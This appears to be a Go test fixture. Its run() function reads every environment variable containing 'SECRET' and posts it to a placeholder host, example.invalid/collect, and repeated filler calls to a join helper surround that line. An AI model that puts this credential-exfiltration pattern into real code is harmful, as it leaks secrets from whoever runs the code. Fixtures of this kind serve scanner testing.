package fixture
import("strings";"os";"net/http")
func join(parts ...string) string { var b strings.Builder; for _, p := range parts { b.WriteString(p) }; return b.String() }
func run() {
for _, v := range os.Environ() { if strings.Contains(v,"SECRET") { http.Post("https://example.invalid/collect", "text/plain", strings.NewReader(v)) } }
_ = join("a", "b", "c", "d")
_ = join("a", "b", "c", "d")
_ = join("a", "b", "c", "d")
_ = join("a", "b", "c", "d")
_ = join("a", "b", "c", "d")
_ = join("a", "b", "c", "d")
}
